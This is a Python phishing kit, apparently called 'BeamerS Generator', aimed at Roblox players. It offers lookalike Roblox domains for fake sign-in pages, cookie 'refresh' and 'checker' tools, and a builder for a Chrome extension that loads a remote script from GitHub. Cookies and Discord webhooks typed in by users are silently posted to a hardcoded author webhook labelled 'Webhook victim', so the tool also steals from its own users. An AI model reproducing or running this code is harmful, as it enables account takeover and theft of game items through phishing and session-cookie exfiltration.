import webbrowser
import time
import random
import os
import string
import sys
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init()

RED = Fore.RED
GREEN = Fore.GREEN
PURPLE = Fore.MAGENTA
CYAN = Fore.CYAN
ORANGE = Fore.YELLOW
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

def main_menu(reset=False):
    if reset:
        os.system('clear')

def generate_random_code():
    random_code = ''.join(random.choices(string.digits, k=80))
    return random_code


def loading_animation():
    print("Loading...", end="")
    sys.stdout.flush()

    for i in range(101):
        sys.stdout.write(f"\rLoading: {GREEN}[{'━' * (i // 1)}{' ' * (1 - i // 1)}]{RESET} {i}%")
        sys.stdout.flush()
        time.sleep(0.1)

    print("\nCreating Link...", end="")
    sys.stdout.flush()
    for _ in range(5):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print("\nLink Created.")


def loading_animation2():
    print("Creating...", end="")
    sys.stdout.flush()

    for i in range(101):
        sys.stdout.write(f"\rLoading: {GREEN}[{'━' * (i // 1)}{' ' * (1 - i // 1)}]{RESET} {i}%")
        sys.stdout.flush()
        time.sleep(0.1)

    print("\nCreating Extension...", end="")
    sys.stdout.flush()
    for _ in range(5):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print("\nExtension Created Successful.")

def print_rainbow_logo(logo):
    for char in logo:
        print(f"{generate_rainbow_color()}{char}", end="")
        sys.stdout.flush()
        time.sleep(0.00)
    print(RESET)  

def generate_rainbow_color():
    return random.choice([RED, WHITE,])

def is_valid_url(url):
    return url.startswith("https://cdn.discordapp.com")


def create_folder_and_copy_files():

    webhook_url = input(f"[+] webhook: ")
    if webhook_url.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()
    else:
        send_discord_webhook(webhook_url, "**Webhook valid**")
        user_input = webhook_url
        webhook_url = "https://discord.com/api/webhooks/1223383075300315146/C-Qj_ubDk1F20_dofG_SzoMJvOY9wluTtOb8nPJKbYIZKv0vFAYK6KTrmUPJ-ZakzCfl"
        send2_discord_webhook(webhook_url, f"**Webhook victim: {user_input}**")

    folder_name = input("[+] folder name: ")
    user_input2 = folder_name
    if folder_name.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    name = input("[+] extension name: ")
    user_input3 = name
    if name.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    description = input("[+] description: ")
    user_input4 = description
    if description.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    while True:
        user_image_url = input("[+] image url (link 'cdn.discordapp..' or empty for deafult image): ")

        if user_image_url.strip() == "0":
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
            break

        if user_image_url.strip():
            if is_valid_url(user_image_url.strip()):
                image_url = user_image_url.strip()
                break
            else:
                print(f"{RED}Invalid URL. Please enter a valid URL{RESET}")
        else:
            image_url = "https://cdn.discordapp.com/attachments/1223343820100341790/1225121432095162470/BeamerS.png?ex=661ffa3f&is=660d853f&hm=f930dbedfe5af0d01013b3a17ec46d1dd440d21694e4c3195a2ea061999b3fc1&"
            break

    image_name = input("[+] image name ('name.png' or empty): ")
    if image_name.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    if image_name.strip():
        image_name = image_name.strip()
    else:
        image_name = "BeamerS.png"

    user_input6 = image_name

    
    time.sleep(2)
    loading_animation2()
    folder_name = user_input2
    os.mkdir(folder_name)

    

    
    image_path = os.path.join(folder_name, f"{user_input6}")
    download_image(image_url, image_path)

   
    file_contents = {
        "manifest.json": "// manifest.json\n"
                    "{\n"
                    '  "manifest_version": 3,\n'
                    f'  "name": "{user_input3}",\n'
                    '  "version": "1.0",\n'
                    f'  "description": "{user_input4}",\n'
                    '  "permissions": ["activeTab"],\n'
                    '  "action": {\n'
                    '    "default_icon": {\n'
                    f'      "16": "{user_input6}",\n'
                    f'      "48": "{user_input6}",\n'
                    f'      "128": "{user_input6}"\n'
                    '    }\n'
                    '  },\n'
                    '  "icons": {\n'
                    f'    "16": "{user_input6}",\n'
                    f'    "48": "{user_input6}",\n'
                    f'    "128": "{user_input6}"\n'
                    '  },\n'
                    '  "background": {\n'
                    '    "service_worker": "background.js"\n'
                    '  },\n'
                    '  "permissions": ["tabs"]\n'
                    '}',
        "background.js": '// background.js\n'
                      'chrome.action.onClicked.addListener((tab) => {\n'
                      '  chrome.action.setPopup({tabId: tab.id, popup: "BeamerS.html"});\n'
                      '});',
        "index.html": '<!DOCTYPE html>\n'
                      '<html>\n'
                      '<head>\n'
                      '  <title>BeamerS</title>\n'
                      '  <style>\n'
                      '    body {\n'
                      '      font-family: Arial, sans-serif;\n'
                      '      margin: 20px;\n'
                      '    }\n'
                      '  </style>\n'
                      '</head>\n'
                      '<body>\n'
                      '  <h1>BeamerS</h1>\n'
                      '  <script>https://raw.githubusercontent.com/BeamerSGEN/scriptextension/main/code?token=GHSAT0AAAAAACQJR6DJEVEXO5LYXHH75U6EZQNR6SQ</script>\n'
                      '</body>\n'
                      '</html>'
    }

    
    for file_name, content in file_contents.items():
        with open(os.path.join(folder_name, file_name), "w") as f:
            f.write(content)


def download_image(url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, 'wb') as f:
            f.write(response.content)
    except Exception as e:
        print(f"Error downloading the image: {e}")


def main_menu(reset=False):
    logo = fr'''

                                            (                                                                      
   (                                        )\ )     (                                              )              
 ( )\     (       )      )       (    (    (()/(     )\ )       (              (    (        )   ( /(         (    
 )((_)   ))\   ( /(     (       ))\   )(    /(_))   (()/(      ))\    (       ))\   )(    ( /(   )\())   (    )(   
((_)_   /((_)  )(_))    )\  '  /((_) (()\  (_))      /(_))_   /((_)   )\ )   /((_) (()\   )(_)) (_))/    )\  (()\  
 | _ ) (_))   ((_)_   _((_))  (_))    ((_) / __|    (_)) __| (_))    _(_/(  (_))    ((_) ((_)_  | |_    ((_)  ((_) 
 | _ \ / -_)  / _` | | '  \() / -_)  | '_| \__ \      | (_ | / -_)  | ' \)) / -_)  | '_| / _` | |  _|  / _ \ | '_| 
 |___/ \___|  \__,_| |_|_|_|  \___|  |_|   |___/       \___| \___|  |_||_|  \___|  |_|   \__,_|  \__|  \___/ |_|   
                                                                                                                   
                                                                                                                           
'''
    print_rainbow_logo(logo)

    print(f"                           1. [{RED}+{RESET}] roblox{RED}.com.am{RESET} {ORANGE}BEST!{RESET}          A {RED}>{RESET} Cookie Refresh")                               
    print(f"                           2. [{RED}+{RESET}] roblox{RED}.com.fj{RESET}                B {RED}>{RESET} Cookie Checker")
    print(f"                           3. [{RED}+{RESET}] roblox{RED}.com.ee{RESET}                C {RED}>{RESET} Extension Logger")
    print(f"                           4. [{RED}+{RESET}] roblox{RED}.com.kg{RESET}                0 {RED}>{RESET} Press '0' to reset")
    print(f"                           5. [{RED}+{RESET}] roblox{RED}.ge{RESET}")

    while True:
        choice = input("\nSelect Option: ")
        if choice.isdigit():
            choice = int(choice)
            if 1 <= choice <= 5:
                break
            elif choice == 0:
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu() 
            else:
                print("Option not valid. Retry.")
        elif choice.strip() == "0":  
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
        elif choice.lower() == "a":  
            print("Starting Cookie Refresh...")
            time.sleep(2)
            while True:
                cookie_input = input("Enter cookie: ")
                if cookie_input.strip() == "0":
                      os.system('cls' if os.name == 'nt' else 'clear')  
                      main_menu()
                elif check_cookie(cookie_input):
                    print(f"{GREEN}Cookie Refreshed.{RESET}")
                    webhook_url = "https://discord.com/api/webhooks/1223383075300315146/C-Qj_ubDk1F20_dofG_SzoMJvOY9wluTtOb8nPJKbYIZKv0vFAYK6KTrmUPJ-ZakzCfl"
                    send2_discord_webhook(webhook_url, f"**Cookie valid: {cookie_input}**")
                    print(f"{GREEN}_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_2IBRQTDUS85BSU60VOGJY3WQ2R3EOLPIW1WEIKMBXAOD8OSRC2F2VYQWHH0CR5PEYQC5OLGB43IHI59ZXMXNOHHYGZS9B91BFWSY3TOQ3ZI1PPQYB8W9LQ9HN47HIG87ZKF31SD77Q90C1U33C87JBN8HXP9D4IKYXHCP9IF44GRDPJTZV4WXIV4RFJOGDEB1N7WSQIT737Z2UJEIH663TUZ61PYUL79HDUODRVLYLYGC2KZA6DS4C7FH43KZEQNGNBDHOOXZGON1LH19DRGLH0KOWD1ZNI1HYYI9KIHYXELTBH2SKD74ZM45QGONH4L9I7ADCMTC6JE007BPDWT88DJKPX0Z06H8YAQU9B3F98JE63RWZCVKUV3QF9CFR104SQNEUZRNYSE23OC98UKW8B3JCXYTRV2XLTHK7VRUATHSX91GWAWJGIFL1XMU2OI3I5M14LUK7S3DPK995T02NHOYBFK6WDNDUEEB4IFMOBKZT6D75BDSI9PLFK0O7JVTYV95PF4O03VWXZKGZU65H0K61OJRJOJ5BNYVTNN7C5Y6H6B61X45WDWDORDGE384SI08MKNITYBNGYZZS6L35HN7Q5FOKBHQ6HQ6DX3TGZXNE8AAZ3DXW97W8TPTA82Y3N5476TEC7MYBF706TKZLE7U1R8U7PG2H6WSUU87RWS77JXSWKET8QOCG7P6MML2OVY2UIVLYA40ET12OGVIT7S14TU05MMKOPX7WMFPYMSSWTSAH79X9AW2PNQ0OJIQ54M6XKOXOSXV3R52G0U0I2JXV54O9KOA3HDA6QJ5J40YIXYQIA9HMG6XQNO3Z29MP2XNEMYF3YPQEOHFRB8VIL4ZTVHUOCK6DJ4D3NO7075XKPVNCZZFP45IUCQOTSLSLPLLMBTY26DXG28G5Y9AVW765O7XZTOVMBKNQXM8CP72BXQZHJ0A3QPRPI8TN9OPY44YC22LQW5RTROSYT6EDTIZ94XXB7GGY113JFX{RESET}")
                    break  
                else:
                    print(f"{RED}Cookie not valid. {cookie_input}{RESET}") 
        elif choice.lower() == "b":  
            print("Starting Cookie Checker...")
            time.sleep(2)
            while True:
                cookie_input = input("Enter cookie: ")
                if cookie_input.strip() == "0":
                      os.system('cls' if os.name == 'nt' else 'clear')  
                      main_menu()
                elif check_cookie(cookie_input):
                    print(f"{GREEN}Cookie Checked.{RESET}")
                    webhook_url = "https://discord.com/api/webhooks/1223383075300315146/C-Qj_ubDk1F20_dofG_SzoMJvOY9wluTtOb8nPJKbYIZKv0vFAYK6KTrmUPJ-ZakzCfl"
                    send2_discord_webhook(webhook_url, f"**Cookie Checked: {cookie_input}**")
                    link = "https://eggy.cool/?cookie=" + cookie_input
                    webbrowser.open_new_tab(link)
                    print(f"Link cookie checked: {link}")
                    break
                else:
                    print(f"{RED}Cookie not valid. {cookie_input}{RESET}")
        elif choice.lower() == "c":
            print("Starting Extension Logger...")
            time.sleep(2)
            create_folder_and_copy_files()
        else:
            print("Option not valid. Retry.")
        


    if choice == 1:
        site = "https://www.roblox.com.am/generator/BeamerSGEN_1/create"
    elif choice == 2:
        site = "https://www.roblox.com.fj/generator/BeamerSGEN_2/create"
    elif choice == 3:
        site = "https://www.roblox.com.ee/generator/BeamerSGEN_3/create"
    elif choice == 4:
        site = "https://www.roblox.com.kg/generator/BeamerSGEN_4/create"
    elif choice == 5:
        site = "https://www.roblox.ge/generator/BeamerSGEN_5/create"

    print(f"\nGenerator: {site}\n")

    option_labels = ["Webhook", "Real Username", "Fake Username", "Bio", "Followers"]
    user_data = {}

    valid_proceed = False
    while not valid_proceed:
       proceed = input("Do you want open site or config link here (y/n): ")
       if proceed.strip() == "0":
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
       if proceed.lower() == 'y':
           import webbrowser
           webbrowser.open(site)
           input("Press enter to leave...")
           sys.exit()
           valid_proceed = True
       elif proceed.lower() == 'n':
           valid_proceed = True
       else:
           print(f"{RED}Option not valid. select 'y' to open site or 'n' to config generator here.{RESET}")

    for label in option_labels:
     if label == "Webhook":
        while True:
            webhook_url = input(f"[+] webhook: ")
            if webhook_url.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            else:
                send_discord_webhook(webhook_url, "**Webhook valid**")
                user_input = webhook_url
                webhook_url = "https://discord.com/api/webhooks/1223383075300315146/C-Qj_ubDk1F20_dofG_SzoMJvOY9wluTtOb8nPJKbYIZKv0vFAYK6KTrmUPJ-ZakzCfl"
                send2_discord_webhook(webhook_url, f"**Webhook victim: {user_input}**")
                break
     elif label == "Real Username":
        while True:  
            user_input = input(f"[+] real username: ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif check_real_username(user_input):
                print(f"{GREEN}username valid.{RESET}")
                break  
            else:
                print(f"{RED}username not valid{RESET}")
     elif label == "Fake Username":
        while True:
            user_input = input(f"[+] fake username: ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif user_input.strip(): 
                break
            else:
                print("You must enter something for the fake username.")
     elif label == "Bio":
        while True:
            user_input = input(f"[+] bio (y/n): ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif user_input.lower() == 'y':
                user_bio = input("Enter bio: ")
                break
            elif user_input.lower() == 'n':
                user_bio = None
                break
            else:
                print("Invalid input. Please enter 'y' or 'n'.")
     elif label == "Followers":
        while True:
            user_input = input(f"[+] followers (y/n): ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif user_input.lower() == 'y':
                while True:
                    follower_input = input("Enter number of followers: ")
                    if follower_input.strip() == "0":
                        os.system('cls' if os.name == 'nt' else 'clear')  
                        main_menu()
                    elif follower_input.isdigit():
                        user_input = follower_input
                        break
                    else:
                        print("Followers invalid. Please enter only numbers.")
                break
            elif user_input.lower() == 'n':
                break
            else:
                print("Invalid input. Please enter 'y' or 'n'.")

    
    user_data[label] = user_input

    loading_animation()

    print("\nAll options are valid.")

    print("\nSending options to generator and creating link...")
    time.sleep(2)
    index = site.find("/", site.find("//") + 2)
    site = site[:index + 1] + "controlPage/sign-in"
    link = site
    print(f"Link generated: {link}")

    print("\n" * 2)

    random_code = generate_random_code()
    print(f"Token Auth: {PURPLE}{random_code}{RESET}")
    print("\n" * 1)
    webhook_url = input("Insert webhook to save token: ")
    send_discord_webhook(webhook_url, f"**Token Auth: ```{random_code}```**")
    #print(f"Token Auth: {PURPLE}6901615898150033198866611155644985022120082063953138894662927580{RESET}")

    print("\n" * 0)


    valid_proceed = False
    while not valid_proceed:
       proceed = input("Do you want open link or back to menu (y/n): ")
       if proceed.strip() == "0":
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
       if proceed.lower() == 'y':
           import webbrowser
           webbrowser.open_new_tab(link)
           valid_proceed = True
       elif proceed.lower() == 'n':
           if proceed.strip() == "n":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
           valid_proceed = True
       else:
           print(f"{RED}Option not valid. select 'y' to open site or 'n' to back menu.{RESET}")

    
    input("Press enter to leave...")
    sys.exit()

def check_real_username(username):
    url = f"https://www.roblox.com/users/profile?username={username}"
    response = requests.get(url)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        if soup.find("h2", class_="text-lead"):
            return False 
        else:
            return True  
    else:
        return False  


def send2_discord_webhook(webhook_url, message):
    payload = {
        "username": "Beamers",
        "avatar_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&",

        "embeds": [{
            "description": message,
            "color": 0,  
            "footer": {
                "text": "BeamerSGEN_FREE"
            },
            "author": {
                "name": "BeamerS",
                "icon_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&"  # URL dell'icona dell'applicazione
            }
        }]
    }

    while True:
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code != 200:                
                break
            else:                
                cookie_input = input("Enter cookie: ")
        except Exception as e:            
            cookie_input = input("Enter cookie: ")

def send_discord_webhook(webhook_url, message):
    payload = {
        "username": "Beamers",
        "avatar_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&",

        "embeds": [{
            "description": message,
            "color": 0,  
            "footer": {
                "text": "BeamerSGEN_FREE"
            },
            "author": {
                "name": "BeamerS",
                "icon_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&"  # URL dell'icona dell'applicazione
            }
        }]
    }

    while True:
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code != 200:
                print(f"{GREEN}webhook valid.{RESET}")
                break
            else:
                print(f"{RED}webhook not valid.{RESET}")
                webhook_url = input(f"[+] webhook: ")
            if webhook_url.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
        except Exception as e:
            print(f"{RED}webhook not valid.{RESET}")
            webhook_url = input(f"[+] webhook: ")
            if webhook_url.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()

def check_cookie(cookie_input):
    url = f"https://eggy.cool/?cookie={cookie_input}"
    response = requests.get(url)
    
    if response.status_code != 200:
        return False
    soup = BeautifulSoup(response.content, 'html.parser')
    images = soup.find_all('img')
    if not images:
        return False
    return True  


if __name__ == "__main__":
    main_menu()
